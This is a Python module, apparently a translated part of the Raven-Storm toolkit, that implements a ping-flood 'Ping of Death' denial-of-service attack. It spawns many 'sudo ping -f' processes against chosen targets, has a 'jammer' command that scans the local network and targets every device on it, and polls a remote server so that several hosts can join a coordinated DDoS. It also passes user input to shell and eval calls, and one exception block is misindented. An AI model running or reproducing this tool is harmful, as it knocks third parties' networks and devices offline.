# 2020
# The Raven-Storm Toolkit was programmed and developed by Taguar258.
# The Raven-Storm Toolkit is published under the MIT Licence.
# The Raven-Storm Toolkit is based on the CLIF-Framework.
# The CLIF-Framework is programmed and developed by Taguar258.
# The CLIF-Framework is published under the MIT Licence.

import socket
from os import getcwd, name, path, system
from sys import version
from threading import Thread
from time import sleep

import requests
from CLIF_Framework.framework import event, tools  # noqa: I900

try:
	from os import geteuid

	geteuid_exists = True
except ImportError:
	geteuid_exists = False

try:
	import nmap
except Exception as e:
	print("请安装以下模块：", e)
	quit()

event = event()
tools = tools()


class Main:
	def __init__(selfie, console):  # noqa: N805
		global self
		global var
		self = selfie
		var = console  # noqa: VNE002

		self._add_commands()

		# Colors
		var.C_None = "\x1b[0;39m"
		var.C_Bold = "\x1b[1;39m"
		var.C_Green = "\x1b[32m"
		var.C_Violet = "\x1b[34m"
		var.C_Dark_Blue = "\x1b[35m"
		var.C_Red = "\x1b[31m"

		var.nm = None
		var.nmapinstalled = False
		var.target = ""
		var.size = 65500
		var.threads = 30
		var.sleep = 0
		var.interval = 0
		var.auto_stop = 0

		var.l3_debug = False

	def _add_commands(self):
		event.commands(self.exit_console, ["exit", "quit", "e", "q"])
		event.commands(self.show_values, ["values", "ls"])
		event.command(self.help)

		event.commands(self.run_shell, ".")
		event.commands(self.debug, "$")

		event.help(["values", "ls"], "Show all options.")

		event.help("target", "Set the target.")
		event.help("targets", "Set multiple targets.")
		event.help("size", "Set packet size.")
		event.help("threads", "Threads to use.")
		event.help("sleep", "Delay between threads.")
		event.help("interval", "Delay between each packet send.")
		event.help("auto stop", "Automatically stop attack after x seconds.")
		event.help("run", "Run the Ping of Death.")
		event.help("jammer", "Kill a whole wifi network, by targeting all.")

	def banner(self):
		system("clear || cls")
		print(("""C_B----------------------------------------------------------C_W
THE CREATOR DOES NOT TAKE ANY RESPONSIBILITY FOR DAMAGE CAUSED.
THE USER ALONE IS RESPONSIBLE, BE IT: ABUSING RAVEN-STORM
TO FIT ILLEGAL PURPOSES OR ACCIDENTAL DAMAGE CAUSED BY RAVEN-STORM.
BY USING THIS SOFTWARE, YOU MUST AGREE TO TAKE FULL RESPONSIBILITY
FOR ANY DAMAGE CAUSED BY RAVEN-STORM.
EVERY ATTACK WILL CAUSE TEMPORARY DAMAGE, BUT LONG-TERM DAMAGE IS
DEFFINITIFLY POSSIBLE.
RAVEN-STORM SHOULD NOT SUGGEST PEOPLE TO PERFORM ILLEGAL ACTIVITIES.
C_B----------------------------------------------------------C_W""").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
		self.help()
		if not geteuid_exists:
			print("")
			print("很抱歉，该功能暂不支持原生 Windows 环境，请尝试通过 WSL 运行。.")
			print("您将被重定向至主菜单。.")
			print("")
			input("[按 Enter 键继续]")
			print("")
			var.stop()
			return

	def exit_console(self):
		print("祝您愉快。")
		quit()

	def run_shell(self, command):
		print("")
		system(tools.arg("输入 shell 命令：", ". ", command))
		print("")

	def debug(self, command):
		print("")
		eval(tools.arg("输入调试命令：", "$ ", command))
		print("")

	@event.command
	def clear():
		system("clear || cls")

	@event.event
	def on_ready():
		try:
			var.nm = nmap.PortScanner()
			var.nmapinstalled = True
		except Exception as e:
			system("clear || cls")
			print("Please install the nmap package.")
			print("Some functions will not work without it.")
			print(e)
			try:
				input("[Press enter to continue without nmap]")
				print("")
			except Exception:
				quit()

		try:
			if geteuid() != 0:
				print("It is adviced to run the l3 attack with sudo privileges")
				try:
					input("[Press enter to continue without sudo]")
				except Exception:
					quit()
		except Exception:
			pass

		self.banner()

	@event.event
	def on_command_not_found(command):
		print("")
		print("您输入的命令不存在。")
		print("")

	def check_session(self):
		if var.session[1][0] and len(var.session[1][1]) >= 1:
			if len(var.session[1][1][0]) >= 1:
				run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
				var.session[1][1][0] = var.session[1][1][0][1:]
			else:
				var.session[1][1] = var.session[1][1][1:]
				run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
				var.session[1][1][0] = var.session[1][1][0][1:]
			var.run_command = run_following

	@event.event
	def on_input():
		self.check_session()
		if var.server[0] and not var.server[1]:
			while True:
				data = requests.post((var.server[2] + ("get/com%s" % var.server[4])), data={"password": var.server[3]}).text
				if data != "500":
					var.server[4] = var.server[4] + 1
					var.run_command = [data, data]
					print(var.ps1 + "\r")
					break
				else:
					sleep(1)

	@event.event
	def on_interrupt():
		print("")
		var.stop()

	@event.event
	def on_command(command):
		if var.session[0][0]:
			var.session[0][1].write(command + "\n")
		if var.server[0] and var.server[1]:
			status = requests.post((var.server[2] + "set/com"), data={"password": var.server[3], "data": command}).text
			if status != "200":
				print("")
				print("向服务器发送命令时发生错误。")
				print("")

	@event.command
	def debug():
		var.l3_debug = True
		print("")
		print("调试模式已启用。")
		print("")

	def show_values(self):
		print("")
		print("目标：%s" % var.target)
		print("数据包大小：%s" % var.size)
		print("线程：%s" % var.threads)
		print("线程间延迟：%s" % var.sleep)
		print("数据包间延迟：%s" % var.interval)
		print("自动停止时间：%s" % var.auto_stop)
		print("")

	def help(self):
		event.help_title("\x1b[1;39mPoD Help:\x1b[0;39m")
		tools.help("|-- ", " :: ", event)
		print("")

	@event.command
	def targets(command):
		print("")
		var.target = tools.arg("目标（用 ', ' 分隔）：", "targets ", command).split(", ")
		for ip in var.target:
			if "." not in ip:
				print("该 IP 不存在。")
		print("")

	@event.command
	def target(command):
		print("")
		var.target = tools.arg("目标：", "target ", command)
		if "." not in var.target:
			print("该 IP 不存在。")
		print("")

	@event.command
	def size(command):
		print(" ")
		try:
			sizezw = int(tools.arg("大小（KB）：", "size ", command))
			if sizezw < 5:
				print("大小必须大于 4KB。")
			elif sizezw > 65500:
				print("大小必须小于 65500KB。")
			else:
				var.size = sizezw
		except Exception as e:
			print("执行时发生错误。", e)
		print(" ")

	@event.command
	def threads(command):
		print(" ")
		try:
			var.threads = int(tools.arg("线程：", "threads ", command))
		except Exception as e:
			print("执行时发生错误。", e)
		print(" ")

	@event.command
	def sleep(command):
		print(" ")
		try:
			var.sleep = float(tools.arg("线程间延迟：", "sleep ", command))
		except Exception as e:
			print("执行时发生错误。", e)
		print(" ")

	@event.command
	def interval(command):
		print(" ")
		try:
			var.interval = float(tools.arg("Delay between each packet: ", "interval ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def auto_stop(command):
		print(" ")
		try:
			var.auto_stop = int(tools.arg("Time until auto stop: ", "auto stop ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def jammer():
		print(" ")
		try:
			gateways = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			gateways.connect(("8.8.8.8", 80))
			gateway = ".".join((gateways.getsockname()[0].split("."))[:len(gateways.getsockname()[0].split(".")) - 1])
			localip = gateways.getsockname()[0]
			gateways.close()
			var.nm.scan(hosts=("%s.0/24" % gateway), arguments="-sP")
			lanscandev = [(x) for x in var.nm.all_hosts()]
			var.target = []
			for lanscandevice in lanscandev:
				if lanscandevice != localip and lanscandevice != ("%s.1" % gateway):
					var.target.append(lanscandevice)
			print("All devices in Internet are now targeted.", var.target)
		except Exception as e:
			if not var.nmapinstalled:
					print("请安装 nmap 以继续。")
				else:
					print("执行时发生错误。", e)

	def pod(self, size, target, threads, threadssleep, podinterval, podautodl):
		print(("正在开始攻击...\nC_B[按 ENTER 或 CTRL + C 停止攻击]\nC_W").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
		targets = []
		feat = ""
		if podinterval != 0:
			feat += ("-i %s " % podinterval)
		if podautodl != 0:
			feat += ("-w %s " % podautodl)
		if isinstance(target, list):
			targets = target
		else:
			targets = [target]
		del(target)
		if var.l3_debug:
			output_to_dev_null = ""
		else:
			output_to_dev_null = "> /dev/null "
		for target in targets:
			if geteuid() == 0:
				print(("正在以 C_Bsudo 权限C_W 运行线程。" ).replace("C_W", var.C_None).replace("C_B", var.C_Bold))
				killcom = ('sudo ping -f -q -s %s %s %s %s& ' % (size, feat, target, output_to_dev_null)).replace("  ", " ")
			else:
				print(("正在以 C_B无 sudo 权限C_W 运行线程。" ).replace("C_W", var.C_None).replace("C_B", var.C_Bold))
				killcom = ("ping -q -s %s %s %s %s& " % (size, feat, target, output_to_dev_null)).replace("  ", " ")
			try:
				for i in range(int(threads)):
					system(killcom)
					sleep(float(threadssleep))
			except KeyboardInterrupt:
				system("killall -SIGINT ping")
				print("攻击终止。")
			except Exception as pingerror:
				var.command_log.append("错误：%s" % pingerror)
				print("执行过程中发生错误。", pingerror)
				system("killall -SIGINT ping")
				print("攻击终止。")
			try:
				input("")
				system("killall -SIGINT ping")
				print("攻击终止。")
			except Exception:
				system("killall -SIGINT ping")
				print("攻击终止。")

	@event.command
	def run():
		def execute():
			self.pod(var.size, var.target, var.threads, var.sleep, var.interval, var.auto_stop)

			def reset_attack():
				print("正在停止线程...")
				system("killall ping")
				if var.l3_debug:
					print("正在保存调试日志...")
					output_to = path.join(getcwd(), "l3_debug_log.txt")

					write_method = "a"
					if path.isfile(output_to):
						write_method = "a"
					else:
						write_method = "w"

					output_file = open(output_to, write_method)
					if write_method == "a":
						output_file.write("------------- New Log -------------")
					output_file.write(str(name + "\n"))
					output_file.write(str(version + "\n"))
					output_file.write(str("\n".join(var.command_log)))
					output_file.close()
				print("完成。")
				quit()

			def check_stopped_execution():
				while True:
					data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
					if data != "True":
						reset_attack()
						break
					else:
						sleep(1)
			try:
				if var.server[0] and var.server[0]:
					rec_t = Thread(target=check_stopped_execution)
					rec_t.start()
				input("\r")
			except KeyboardInterrupt:
				pass

			if var.server[0] and var.server[1]:
				status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
				if status != "200":
					print("发送数据到服务器时发生错误。")

			reset_attack()

		if var.server[0] and not var.server[1]:
			while True:
				data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
				if data == "True":
					execute()
					break
				else:
					sleep(1)
		elif not tools.question("\n您是否同意使用条款？"):
			print("未接受协议。")
			quit()
		else:
			if var.server[0] and var.server[1]:
				if tools.question("\n是否希望将该主机用作 DDoS 的一部分？"):
					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
					if status != "200":
						print("发送数据到服务器时发生错误。")
					execute()
				else:
					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
					if status != "200":
						print("发送数据到服务器时发生错误。")
					try:
						print("[按回车停止攻击。]")
					except KeyboardInterrupt:
						pass
					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
					if status != "200":
						print("An error occured, while sending data to the server.")
			else:
				execute()


def setup(console):
	console.ps1 = "L3> "
	console.add(Main(console), event)
